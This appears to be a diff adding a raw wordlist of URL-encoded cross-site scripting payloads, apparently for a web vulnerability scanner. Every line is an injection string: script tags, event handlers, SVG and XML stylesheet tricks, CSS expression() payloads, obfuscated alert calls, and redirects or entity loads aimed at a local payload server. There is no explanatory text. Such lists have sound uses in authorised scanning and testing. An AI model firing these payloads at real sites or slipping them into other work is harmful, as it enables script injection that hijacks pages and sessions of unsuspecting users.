+'%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EXXX%3C/div%3E  
+'%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EXXX%3C/div%3E  
+%3Cdiv%20style=%22[a]color[b]:[c]red%22%3EXXX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22[a]color[b]:[c]red%22%3EXXX%3C/div%3E  
+'%3E%3Cdiv%20style=%22[a]color[b]:[c]red%22%3EXXX%3C/div%3E  
+%3Cdiv%20style=%22/63&  
+%22%3E%3Cdiv%20style=%22/63&  
+'%3E%3Cdiv%20style=%22/63&  
+%3C//%20style=x:expression/28write(1)/29%3E  
+%22%3E%3C//%20style=x:expression/28write(1)/29%3E  
+'%3E%3C//%20style=x:expression/28write(1)/29%3E  
+%3Cstyle%3E*%7Bx:expression(write(1))%7D%3C/style%3E  
+%22%3E%3Cstyle%3E*%7Bx:expression(write(1))%7D%3C/style%3E  
+'%3E%3Cstyle%3E*%7Bx:expression(write(1))%7D%3C/style%3E  
+%3Cdiv%20style=%22background:url(http://foo.f/f%20oo/;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22background:url(http://foo.f/f%20oo/;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+'%3E%3Cdiv%20style=%22background:url(http://foo.f/f%20oo/;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:alert(1));%22%3EX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:alert(1));%22%3EX%3C/div%3E  
+'%3E%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:alert(1));%22%3EX%3C/div%3E  
+%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/2F/2A/22/2A/2F/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+%22%3E%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/2F/2A/22/2A/2F/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+'%3E%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/2F/2A/22/2A/2F/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+%3Cdiv%20style=%22background:url(/f  
+%22%3E%3Cdiv%20style=%22background:url(/f  
+'%3E%3Cdiv%20style=%22background:url(/f  
+%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+'%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX%3C/div%3E  
+%3Cx%20style=%22background:url('x[a];color:red;/*')%22%3EXXX%3C/x%3E  
+%22%3E%3Cx%20style=%22background:url('x[a];color:red;/*')%22%3EXXX%3C/x%3E  
+'%3E%3Cx%20style=%22background:url('x[a];color:red;/*')%22%3EXXX%3C/x%3E  
+%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=1%7D%7D).$=alert%3C/script%3E  
+%22%3E%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=1%7D%7D).$=alert%3C/script%3E  
+'%3E%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=1%7D%7D).$=alert%3C/script%3E  
+%3Cscript%3E(%7B0:  
+%22%3E%3Cscript%3E(%7B0:  
+'%3E%3Cscript%3E(%7B0:  
+%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Balert(1)%7D),x%3C/script%3E  
+%22%3E%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Balert(1)%7D),x%3C/script%3E  
+'%3E%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Balert(1)%7D),x%3C/script%3E  
+%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('alert(1)')()%3C/script%3E  
+%22%3E%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('alert(1)')()%3C/script%3E  
+'%3E%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('alert(1)')()%3C/script%3E  
+%3Cscript%3Ehistory.pushState(0,0,'/i/am/somewhere_else');%3C/script%3E  
+%22%3E%3Cscript%3Ehistory.pushState(0,0,'/i/am/somewhere_else');%3C/script%3E  
+'%3E%3Cscript%3Ehistory.pushState(0,0,'/i/am/somewhere_else');%3C/script%3E  
+%3Cscript%20src=%22  
+%22%3E%3Cscript%20src=%22  
+'%3E%3Cscript%20src=%22  
++ADw-html+AD4APA-body+AD4APA-div+AD4-top%20secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);  
+%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E  
+%22%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E  
+'%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert(1)%3C/script%20%3C/b%3E%3C/b%3E  
+%3Cscript%3C%7Balert(1)%7D/%3E%3C/script%20%3C/%3E  
+%22%3E%3Cscript%3C%7Balert(1)%7D/%3E%3C/script%20%3C/%3E  
+'%3E%3Cscript%3C%7Balert(1)%7D/%3E%3C/script%20%3C/%3E  
+0?%3Cscript%3EWorker(%22  
+%3Cscript%3Ecrypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')%3C/script%3E  
+%22%3E%3Cscript%3Ecrypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')%3C/script%3E  
+'%3E%3Cscript%3Ecrypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')%3C/script%3E  
+%3Cscript%3E[%7B'a':Object.prototype.__defineSetter__('b',function()%7Balert(arguments[0])%7D),'b':['secret']%7D]%3C/script%3E  
+%22%3E%3Cscript%3E[%7B'a':Object.prototype.__defineSetter__('b',function()%7Balert(arguments[0])%7D),'b':['secret']%7D]%3C/script%3E  
+'%3E%3Cscript%3E[%7B'a':Object.prototype.__defineSetter__('b',function()%7Balert(arguments[0])%7D),'b':['secret']%7D]%3C/script%3E  
+%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg  
+%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg  
+'%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3C/svg  
+%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E  
+%3Csvg%20onload=%22javascript:alert(1)%22%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3C/svg%3E  
+%22%3E%3Csvg%20onload=%22javascript:alert(1)%22%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3C/svg%3E  
+'%3E%3Csvg%20onload=%22javascript:alert(1)%22%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3C/svg%3E  
+%3Csvg%3E%3Cstyle%3E&lt;img/src=x%20onerror=alert(1)//%20%3C/b%3E  
+%22%3E%3Csvg%3E%3Cstyle%3E&lt;img/src=x%20onerror=alert(1)//%20%3C/b%3E  
+'%3E%3Csvg%3E%3Cstyle%3E&lt;img/src=x%20onerror=alert(1)//%20%3C/b%3E  
+%3C?xml-stylesheet%20href=%22javascript:alert(1)%22?%3E%3Croot/%3E  
+%22%3E%3C?xml-stylesheet%20href=%22javascript:alert(1)%22?%3E%3Croot/%3E  
+'%3E%3C?xml-stylesheet%20href=%22javascript:alert(1)%22?%3E%3Croot/%3E  
+%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E&  
+%22%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E&  
+'%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E&  
+%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+%22%3E%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+'%3E%3C!DOCTYPE%20x[%3C!ENTITY%20x%20SYSTEM%20%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E]%3E%3Cy%3E&x;%3C/y%3E  
+%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E  
+%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(2));%7d%22?%3E  
+%22%3E%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(2));%7d%22?%3E  
+'%3E%3C?xml-stylesheet%20type=%22text/css%22%20href=%22data:,*%7bx:expression(write(2));%7d%22?%3E  
+%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22  
+%22%3E%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22  
+'%3E%3C?xml-stylesheet%20type=%22text/xsl%22%20href=%22  
+%3C!ENTITY%20x%20%22&  
+%22%3E%3C!ENTITY%20x%20%22&  
+'%3E%3C!ENTITY%20x%20%22&  
+X%3Cx%20style=%60behavior:url(  
+1%3Cset/xmlns=%60urn:schemas-microsoft-com:time%60%20style=%60beh&  
+1%3Canimate/xmlns=urn:schemas-microsoft-com:time%20style=behavior:url(  
+1%3Cvmlframe%20xmlns=urn:schemas-microsoft-com:vml%20style=behavior:url(  
+%3Cxml%3E%20%3Crect%20style=%22height:100%;width:100%%22%20id=%22X%22%20onmouseover=%2
+%22%3E%3Cxml%3E%20%3Crect%20style=%22height:100%;width:100%%22%20id=%22X%22%20onmouseover=%2
+'%3E%3Cxml%3E%20%3Crect%20style=%22height:100%;width:100%%22%20id=%22X%22%20onmouseover=%2
+1%3Ca%20href=  
+%3Ca%20style=%22behavior:url(  
+%22%3E%3Ca%20style=%22behavior:url(  
+'%3E%3Ca%20style=%22behavior:url(  
+%3Cx%20style=%22behavior:url(test.sct)%22%3E  
+%22%3E%3Cx%20style=%22behavior:url(test.sct)%22%3E  
+'%3E%3Cx%20style=%22behavior:url(test.sct)%22%3E  
+%3CSCRIPTLET%3E%20%3CIMPLEMENTS%20Type=%22Behavior%22%3E%3C/IMPLEMENTS%3E%3CSCRIPT%20Language=%22javascript%22%3Ealert(1)%3C/SCRIPT%3E%3C/SCRIPTLET%3E  
+%22%3E%3CSCRIPTLET%3E%20%3CIMPLEMENTS%20Type=%22Behavior%22%3E%3C/IMPLEMENTS%3E%3CSCRIPT%20Language=%22javascript%22%3Ealert(1)%3C/SCRIPT%3E%3C/SCRIPTLET%3E  
+'%3E%3CSCRIPTLET%3E%20%3CIMPLEMENTS%20Type=%22Behavior%22%3E%3C/IMPLEMENTS%3E%3CSCRIPT%20Language=%22javascript%22%3Ealert(1)%3C/SCRIPT%3E%3C/SCRIPTLET%3E  
+%3Cxml%20id=%22X%22%20src=%22test.htc%22%3E%3C/xml%3E%3Clabel%20dataformatas=%22html%22%20datasrc=%22  
+%22%3E%3Cxml%20id=%22X%22%20src=%22test.htc%22%3E%3C/xml%3E%3Clabel%20dataformatas=%22html%22%20datasrc=%22  
+'%3E%3Cxml%20id=%22X%22%20src=%22test.htc%22%3E%3C/xml%3E%3Clabel%20dataformatas=%22html%22%20datasrc=%22  
+%3C?xml%20version=%221.0%22?%3E%20x%3E%3Cpayload%3E%3C![CDATA[%3Cimg%20src=x%20onerror=alert(1)%3E]]%3E%3C/payload%3E%3C/x%3E  
+%22%3E%3C?xml%20version=%221.0%22?%3E%20x%3E%3Cpayload%3E%3C![CDATA[%3Cimg%20src=x%20onerror=alert(1)%3E]]%3E%3C/payload%3E%3C/x%3E  
+'%3E%3C?xml%20version=%221.0%22?%3E%20x%3E%3Cpayload%3E%3C![CDATA[%3Cimg%20src=x%20onerror=alert(1)%3E]]%3E%3C/payload%3E%3C/x%3E  
+%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(write(1))%22/%3E  
+%22%3E%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(write(1))%22/%3E  
+'%3E%3C?xml-stylesheet%20type=%22text/css%22?%3E%3Croot%20style=%22x:expression(write(1))%22/%3E  
+object%20id=%22x%22%20classid=%22clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C/object%3E%20%3Cobject%20classid=%22clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error=%22alert(1)%22%20style=%22behavior:url(  
+class%20X%20%7Bpublic%20static%20function%20main()%20%7B%20flash.Lib.getURL(new%20flash.net.URLRequest(flash.Lib._root.url%7C%7C%22javascript:alert(1)%22),flash.Lib._root.name%7C%7C%22_top%22);%20%7D%7D  
+%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+%22%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+'%3E%3Cdiv%20id=%22div1%22%3E%3Cinput%20value=%22%60%60onmouseover=alert(1)%22%3E%3C/div%3E%20%3Cdiv%20id=%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById(%22div2%22).innerHTML%20=%20document.getElementById(%22div1%22).innerHTML;%3C/script%3E  
+%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+X%3Cform%20id=test%20onforminput=javascript:alert(1)%3E%3Cinput%3E%3C/form%3E  
+X%3Cform%20id=test%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange==javascript:alert(1)%3EX  
+%3Cinput%20onblur=write(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cinput%20onblur=write(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+'%3E%3Cinput%20onblur=write(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%3Cvideo%20onerror=%22javascript:alert(1)%22%3E%3Csource%3E  
+%22%3E%3Cvideo%20onerror=%22javascript:alert(1)%22%3E%3Csource%3E  
+'%3E%3Cvideo%20onerror=%22javascript:alert(1)%22%3E%3Csource%3E  
+%3Cq/oncut=open()%3E  
+%22%3E%3Cq/oncut=open()%3E  
+'%3E%3Cq/oncut=open()%3E  
+%3Cmarquee%3Cmarquee/onstart=confirm(1)%3E  
+%22%3E%3Cmarquee/onstart=confirm(1)%3E  
+'%3E%3Cmarquee/onstart=confirm(1)%3E/onstart=confirm(1)%3E  
+%3Cbody%20language=vbsonload=alert-1  
+%22%3E%3Cbody%20language=vbsonload=alert-1  
+'%3E%3Cbody%20language=vbsonload=alert-1  
+%3Ccommand%20onmouseover=%22/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x63/x6F/x6E/x66/x69/x72/x6D/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B%22%3ESave%3C/command%3E  
+%22%3E%3Ccommand%20onmouseover=%22/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x63/x6F/x6E/x66/x69/x72/x6D/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B%22%3ESave%3C/command%3E  
+'%3E%3Ccommand%20onmouseover=%22/x6A/x61/x76/x61/x53/x43/x52/x49/x50/x54/x26/x63/x6F/x6C/x6F/x6E/x3B/x63/x6F/x6E/x66/x69/x72/x6D/x26/x6C/x70/x61/x72/x3B/x31/x26/x72/x70/x61/x72/x3B%22%3ESave%3C/command%3E  
+%3Cq/oncut=alert(1)%3E  
+%22%3E%3Cq/oncut=alert(1)%3E  
+'%3E%3Cq/oncut=alert(1)%3E  
+eval(%22aler%22+(!![]+[])[+[]])(%22X%22)  
+window[%22alert%22](%22X%22)  
+this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()  
+%3C%20%3C%20&lt%20&lt;%20&LT%20&LT;%20&  
+%22%3E%3C%20%3C%20&lt%20&lt;%20&LT%20&LT;%20&  
+'%3E%3C%20%3C%20&lt%20&lt;%20&LT%20&LT;%20&  
+%3CA%20HREF=%22http://www.google.com%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://www.google.com%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://www.google.com%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://1113982867/%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://1113982867/%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://1113982867/%22%3EX%3C/A%3E  
+%3CA%20HREF=%22h%20ttp://6&  
+%22%3E%3CA%20HREF=%22h%20ttp://6&  
+'%3E%3CA%20HREF=%22h%20ttp://6&  
+%3CA%20HREF=%22//google%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22//google%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22//google%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html@google%22%3EX%3C/A  
+%22%3E%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html@google%22%3EX%3C/A  
+'%3E%3CA%20HREF=%22http://127.0.0.1:3555/xss_serve_payloads/X.html@google%22%3EX%3C/A  
+%3CA%20HREF=%22http://google:127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://google:127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://google:127.0.0.1:3555/xss_serve_payloads/X.html%22%3EX%3C/A%3E  
+document.write('%3Ciframe%20src=%22http://127.0.0.1:3555/
+http://%22%20onerror=%22alert%281%29;//  
+document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'  
+document.location=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+/%22%3E%3Cscript%3Ealert(/X/)%3Cscript%3E  
+;alert%28String.fromCharCode%2875,67,70%29%29///%27;alert%28String.fromCharCode%2875,67,70%29%29//%22;alert%28String.fromCharCode%2875,67,70%29%29///%22;alert%28String.fromCharCode%2875,67,70%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875,67,70%29%29%3C/SCRIPT%3E  
+%3Cinput%20onfocus=write(1)%20autofocus%3E  
+%22%3E%3Cinput%20onfocus=write(1)%20autofocus%3E  
+'%3E%3Cinput%20onfocus=write(1)%20autofocus%3E  
+%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=javascript:alert(1)//%3E%3C/video%3E  
+%3Cvideo%20poster=prompt(1)//%3E%3C/video%3E  
+%22%3E%3Cvideo%20poster=prompt(1)//%3E%3C/video%3E  
+'%3E%3Cvideo%20poster=prompt(1)//%3E%3C/video%3E  
+%3Cform%20id=test%20onforminput=prompt(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=prompt(2)%3EX%3C/button%3E  
+%22%3E%3Cform%20id=test%20onforminput=prompt(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=prompt(2)%3EX%3C/button%3E  
+'%3E%3Cform%20id=test%20onforminput=prompt(1)%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form=test%20onformchange=prompt(2)%3EX%3C/button%3E  
+%3Cvideo%3E%3Csource%20onerror=%22alert(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22alert(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22alert(1)%22%3E  
+%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E  
+%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E%3C/source%3E%3C/video%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E%3C/source%3E%3C/video%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22prompt(1)%22%3E%3C/source%3E%3C/video%3E  
+%3Cform%3E%3Cbutton%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+%22%3E%3Cform%3E%3Cbutton%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+'%3E%3Cform%3E%3Cbutton%20formaction=%22javascript:alert(1)%22%3EX%3C/button%3E  
+%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20oninput=alert(1)%3E%3Cinput%20autofocus%3E  
+%3Cbody%20oninput=prompt(1)%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20oninput=prompt(1)%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20oninput=prompt(1)%3E%3Cinput%20autofocus%3E  
+%3Cframeset%20onload=prompt(1)%3E  
+%22%3E%3Cframeset%20onload=prompt(1)%3E  
+'%3E%3Cframeset%20onload=prompt(1)%3E  
+%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%22%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+'%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=alert(1)//%22%3E  
+%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+%22%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+'%3E%3Ccomment%3E%3Cimg%20src=%22%3C/comment%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+%22%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+'%3E%3Cstyle%3E%3Cimg%20src=%22%3C/style%3E%3Cimg%20src=x%20onerror=prompt(1)//%22%3E  
+%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Eprompt(1)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Eprompt(1)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20FOR=document%20EVENT=onreadystatechange%3Eprompt(1)%3C/SCRIPT%3E  
+%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=prompt(1)%3Ex%3C/div%3E  
+%22%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=prompt(1)%3Ex%3C/div%3E  
+'%3E%3Cdiv%20style=width:1px;filter:glow%20onfilterchange=prompt(1)%3Ex%3C/div%3E  
+%3Cimg[a][b]src=x[d]onerror[c]=[e]%22prompt(1)%22%3E  
+%22%3E%3Cimg[a][b]src=x[d]onerror[c]=[e]%22prompt(1)%22%3E  
+'%3E%3Cimg[a][b]src=x[d]onerror[c]=[e]%22prompt(1)%22%3E  
+'-prompt(1)'  
+'-alert(1)-'  
+';alert(String.fromCharCode(75,67,70))//';alert(String.fromCharCode(75,67,70))//%22;  
+alert(String.fromCharCode(75,67,70))//%22;alert(String.fromCharCode(75,67,70))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(75,67,70))%3C/SCRIPT%3E  
+%3CIMG%20SRC=  
+%22%3E%3CIMG%20SRC=  
+%3CIMG%20SRC=&  
+%22%3E%3CIMG%20SRC=&  
+'%3E%3CIMG%20SRC=&  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+exp/*%3CA%20STYLE='no/X:noX(%22*//*%22);X:ex/*X*//*/*/pression(alert(%22X%22))'%3E  
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22X%22)%3C/script%3E  
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
